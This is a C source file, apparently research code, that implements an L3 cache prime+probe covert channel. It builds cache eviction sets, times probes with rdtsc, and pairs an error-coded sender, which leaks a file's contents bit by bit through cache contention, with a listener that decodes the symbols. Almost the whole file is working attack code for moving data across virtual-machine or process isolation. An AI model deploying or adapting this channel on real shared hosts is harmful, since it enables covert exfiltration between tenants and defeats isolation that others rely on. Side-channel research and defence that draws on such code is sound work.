#include "attack.h"
#include "ecc.h"

FILE *fp = NULL;
char OUTPUT[256] = {0};
size_t BASE_CACHE_SET_INDEX = 0, N_CACHE_SETS = 1;
s_set *CONFLICT_SET[N_CACHE_SET_INDICES_MAX] = {NULL};
uint64_t *START_ADDR[N_CACHE_SET_INDICES_MAX] = {NULL};

uint64_t probe(uint64_t *start, const size_t n) {
	uint64_t cycle;
	uint64_t a, d;
	uint64_t *ptr;
	uint64_t addr;
	size_t i;

	ptr = start;
	__asm__("lfence;");
	asm volatile ("rdtsc;" : "=a" (a), "=d" (d) : : "ebx", "ecx");
	cycle = (a | ((uint64_t)d << 32));
	__asm__("mov -0x40(%rbp), %r8;");
	for(i = 0; i < n; i++)
		__asm__("mov (%r8), %r8;");
	__asm__("lfence;");
	asm volatile ("rdtsc;" : "=a" (a), "=d" (d) : : "ebx", "ecx");
	cycle = (a | ((uint64_t)d << 32)) - cycle;

	return cycle;
}

uint64_t get_cycle_in_vm(void) {
	uint64_t a, d;
	
	asm volatile ("rdtsc" : "=a" (a), "=d" (d) : : "ebx", "ecx");

	return (a | ((uint64_t)d << 32));
}

uint64_t *create_direction(const s_set *set) {
	// NULL :	Error
	// !NULL :	Starting memory line
	uint64_t *ptr;
	size_t i;

	if(!set)
		return NULL;

	for(i = 0; i < (set->n_elements - 1); i++) {
		ptr = (uint64_t *)(set->elements[i]);
		*ptr = set->elements[i + 1];
	}
	ptr = (uint64_t *)(set->elements[i]);
	*ptr = (uint64_t)NULL;

	return (uint64_t *)(set->elements[0]);
}

uint64_t *change_direction(uint64_t *start, const size_t n) {
	// NULL :	Error
	// !NULL :	Changed starting memory line
	uint64_t *prev, *next, *tmp;
	size_t i;

	if(!start)
		return NULL;

	prev = NULL;
	next = start;
	for(i = 0; i < n; i++) {
		tmp = (uint64_t *)(*next);
		*next = (uint64_t)prev;
		prev = next;
		next = tmp;
	}

	return prev;
}

int init_listener(void) {
	key_t key;
	s_set **potentially_conflict_sets = NULL;
	size_t n_potentially_conflict_sets = 0;
	size_t i;

	// Initialize memory
	key = rand() % KEY;
	if(init_memory(key) < 0) {
		DEBUG_PRINT("\tinit_memory()\n");
		return -1;
	}

	// Get potentially conflict sets
	get_potentially_conflict_sets_again:
	potentially_conflict_sets = get_potentially_conflict_sets(&n_potentially_conflict_sets);
	if(!potentially_conflict_sets) {
		DEBUG_PRINT("\tget_potentially_conflict_sets()\n");
		goto get_potentially_conflict_sets_again;
	}

	for(i = 0; i < N_CACHE_SETS; i++) {
		// Get a conflict set
		get_conflict_set_again:
		CONFLICT_SET[i] = get_conflict_set(potentially_conflict_sets[BASE_CACHE_SET_INDEX + i]);
		if(!CONFLICT_SET[i]) {
			DEBUG_PRINT("\tget_conflict_set()\n");
			goto get_conflict_set_again;
		}
		DEBUG_PRINT("\t(Found a conflict set for cache set #%lu)\n", BASE_CACHE_SET_INDEX + i);
	}
	free_sets(potentially_conflict_sets, n_potentially_conflict_sets);

	return 0;
}

int start_listen(void) {
	// < 0 :	Error
	// == 0 :	Success
	uint64_t CYCLE[N_CACHE_SET_INDICES_MAX][N_TIMESLOTS];
	uint64_t cycle;
	uint64_t MATRIX[N_CACHE_SET_INDICES_MAX];
	size_t i, j, k;
	char DATA[(2 << 15) * 2];
	size_t N_DATA;
	size_t cache_set_inferred, cache_set_inferred_[100], cache_set_inferred__idx;
	size_t cnt, cnt_[N_CACHE_SET_INDICES_MAX];
	int found, found_prev;
	size_t n_successive_silence;

	for(i = 0; i < N_CACHE_SETS; i++) {
		create_direction(CONFLICT_SET[i]);
		START_ADDR[i] = (uint64_t *)(CONFLICT_SET[i]->elements[0]);
	}

	if(strlen(OUTPUT) == 0)
		while(!(fp = fopen("listener.txt", "w"))) ;
	else
		while(!(fp = fopen(OUTPUT, "w"))) ;

	printf("Start listening cache sets\n");
	getchar();

	found_prev = 1;
	n_successive_silence = 0;
	N_DATA = 0;
	while(1) {
		// Get CYCLES
		memset(MATRIX, 0, sizeof(MATRIX));
		for(i = 0; i < N_CACHE_SETS; i++) {
			for(j = 0; j < N_TIMESLOTS; j++) {
				cycle = get_cycle_in_vm();
				CYCLE[i][j] = probe(START_ADDR[i], L3_CACHE_ASSOC * L3_CACHE_N_SLICES);
				START_ADDR[i] = change_direction(START_ADDR[i], L3_CACHE_ASSOC * L3_CACHE_N_SLICES);
				while(get_cycle_in_vm() - cycle < T_TIMESLOT) ;
				if(CYCLE[i][j] > T_DETECT)
					++MATRIX[i];
			}
		}

		// Infer a cache set
		found = 0;
		cache_set_inferred = N_CACHE_SETS;
		for(i = 0; i < N_CACHE_SETS; i++) {
			if(MATRIX[i] >= N_TIMESLOTS) {
				if(found == 0) {
					cache_set_inferred = i;
					found = 1;
				}
				else
					cache_set_inferred = N_CACHE_SETS;
			}
		}
		// found == 0 ::: Not detected
		// found != 0 && cache_set_inferred == N_CACHE_SETS ::: Detected more than one cache set index
		// found != 0 && cache_set_inferred < N_CACHE_SETS ::: Detected a cache set index

		// // Infer bit
		// if(found == 0) {
		// 	if(found_prev == 0)
		// 		++n_successive_silence;
		// 	else
		// 		n_successive_silence = 1;
		// }
		// else {
		// 	n_successive_silence = 0;
		// 	if(found_prev == 0)
		// 		cache_set_inferred__idx = 0;
		// 	cache_set_inferred_[cache_set_inferred__idx++] = cache_set_inferred;
		// }
		// if(n_successive_silence == 2) {
		// 	memset(cnt_, 0, sizeof(cnt_));
		// 	for(i = 0; i < cache_set_inferred__idx; i++) {
		// 		++cnt_[cache_set_inferred_[i]];
		// 	}

		// 	size_t max = 0;
		// 	size_t idx = N_CACHE_SETS;
		// 	for(i = 0; i < N_CACHE_SETS; i++) {
		// 		if(cnt_[i] > max) {
		// 			max = cnt_[i];
		// 			idx = i;
		// 		}
		// 	}

		// 	if(idx == N_CACHE_SETS - 1) {
		// 		DATA[N_DATA] = 0;
		// 		if(N_DATA > 0)
		// 			fprintf(fp, "%s\n", DATA);
		// 		N_DATA = 0;
		// 	}
		// 	else {
		// 		if(idx == N_CACHE_SETS - 1)
		// 			DATA[N_DATA++] = '?';
		// 		else
		// 			DATA[N_DATA++] = '0' + idx;
		// 	}
		// }
		// found_prev = found;

		// // Print CYCLE and MATRIX
		// printf("{");
		// for(i = 0; i < N_CACHE_SETS; i++) {
		// 	if(i > 0)
		// 		printf(",\t");
		// 	printf("(");
		// 	for(j = 0; j < N_TIMESLOTS; j++) {
		// 		if(j > 0)
		// 			printf(",\t");
		// 		printf("%lu", CYCLE[i][j] / 1000);
		// 	}
		// 	printf("), (%lu)", MATRIX[i]);
		// }
		// printf("}");

		// printf("\t");

		// Print CACHE_SET
		if(found == 0) {
			printf(".");
			fprintf(fp, ".");
		}
		else {
			if(cache_set_inferred == N_CACHE_SETS) {
				printf("?");
				fprintf(fp, "?");
			}
			else if(cache_set_inferred == N_CACHE_SETS - 1) {
				printf("#");
				fprintf(fp, "#");
			}
			else {
				printf("%lu", cache_set_inferred);
				fprintf(fp, "%lu", cache_set_inferred);
			}
		}

		printf("\n");
	}

	fclose(fp);

	return 0;
}

void stop_listener(void) {
	size_t i;

	printf("Stop listening cache sets\n");
	for(i = 0; i < N_CACHE_SETS; i++)
		if(CONFLICT_SET[i])
			free_set(CONFLICT_SET[i]);
	free_memory();
	if(fp)
		fclose(fp);
}

int init_sender(void) {
	key_t key;
	s_set **potentially_conflict_sets = NULL;
	size_t n_potentially_conflict_sets = 0;
	size_t i;

	// Initialize memory
	key = rand() % KEY;
	if(init_memory(key) < 0) {
		DEBUG_PRINT("\tinit_memory()\n");
		return -1;
	}

	// Get potentially conflict sets
	get_potentially_conflict_sets_again:
	potentially_conflict_sets = get_potentially_conflict_sets(&n_potentially_conflict_sets);
	if(!potentially_conflict_sets) {
		DEBUG_PRINT("\tget_potentially_conflict_sets()\n");
		goto get_potentially_conflict_sets_again;
	}

	for(i = 0; i < N_CACHE_SETS; i++) {
		// Get a conflict set
		get_conflict_set_again:
		CONFLICT_SET[i] = get_conflict_set(potentially_conflict_sets[BASE_CACHE_SET_INDEX + i]);
		if(!CONFLICT_SET[i]) {
			DEBUG_PRINT("\tget_conflict_set()\n");
			goto get_conflict_set_again;
		}
		DEBUG_PRINT("\t(Found a conflict set for cache set #%lu)\n", BASE_CACHE_SET_INDEX + i);
	}
	free_sets(potentially_conflict_sets, n_potentially_conflict_sets);

	return 0;
}

int start_send() {
	// < 0 :	Error
	// == 0 :	Success
	uint64_t T_MARK = N_CACHE_SETS * (N_TIMESLOTS) * T_TIMESLOT * 5;
	uint64_t T_PAUSE = N_CACHE_SETS * (N_TIMESLOTS) * T_TIMESLOT * 10;
	uint64_t cycle, CYCLE_MARK, CYCLE_PAUSE;
	unsigned char data;
	size_t i, j, k;
	clock_t start, end;
	char DATA[300], ENCODED_DATA[300];
	int N_DATA, N_ENCODED_DATA;

	FILE *in = fopen("Sending_data.txt","r");

	for(i = 0; i < N_CACHE_SETS; i++) {
		create_direction(CONFLICT_SET[i]);
		START_ADDR[i] = (uint64_t *)(CONFLICT_SET[i]->elements[0]);
	}

	if(strlen(OUTPUT) == 0)
		while(!(fp = fopen("sender.txt", "w"))) ;
	else
		while(!(fp = fopen(OUTPUT, "w"))) ;

	printf("Start sending data\n");
	getchar();

	for(k=0; k<10; k++)
	{
		while(!feof(in)) {

			N_DATA=0;

			while(!feof(in) && N_DATA <=223)
			{
				fscanf(in,"%c", &DATA[N_DATA]);
				N_DATA++;
			}

			encode_data(DATA, N_DATA, ENCODED_DATA);

			N_ENCODED_DATA = N_DATA + 32;

			start = clock();
			// Control bit
			cycle = get_cycle_in_vm();
			do {
				probe(START_ADDR[2], L3_CACHE_ASSOC * L3_CACHE_N_SLICES);
			} while((CYCLE_MARK = get_cycle_in_vm() - cycle) < T_MARK);
			cycle = get_cycle_in_vm();
			while((CYCLE_PAUSE = get_cycle_in_vm() - cycle) < T_PAUSE);
			// printf("#");

			// Data bits
			for(i = 0; i < N_ENCODED_DATA; i++) {
				
				data = ENCODED_DATA[i];

				for(j=0; j<8; j++)
				{
					cycle = get_cycle_in_vm();
					do {
						probe(START_ADDR[data % 2], L3_CACHE_ASSOC * L3_CACHE_N_SLICES);
					} while((CYCLE_MARK = get_cycle_in_vm() - cycle) < T_MARK);
					cycle = get_cycle_in_vm();
					while((CYCLE_PAUSE = get_cycle_in_vm() - cycle) < T_PAUSE);

					data >>=1;

				}
			}


			// Control bit
			cycle = get_cycle_in_vm();
			do {
				probe(START_ADDR[2], L3_CACHE_ASSOC * L3_CACHE_N_SLICES);
			} while((CYCLE_MARK = get_cycle_in_vm() - cycle) < T_MARK);
			cycle = get_cycle_in_vm();
			while((CYCLE_PAUSE = get_cycle_in_vm() - cycle) < T_PAUSE);
			// printf("#");
			// printf("\n");
			end = clock();

			printf("[%lu]\tSpent %lf seconds\n", k, (double)(end - start) / CLOCKS_PER_SEC);
			fprintf(fp, "[%lu]\tSpent %lf seconds\n", k, (double)(end - start) / CLOCKS_PER_SEC);
		}

		rewind(in);
	}

	return 0;
}


void stop_sender(void) {
	size_t i;

	printf("Stop sending data\n");
	for(i = 0; i < N_CACHE_SETS; i++)
		if(CONFLICT_SET[i])
			free_set(CONFLICT_SET[i]);
	free_memory();
	if(fp)
		fclose(fp);
}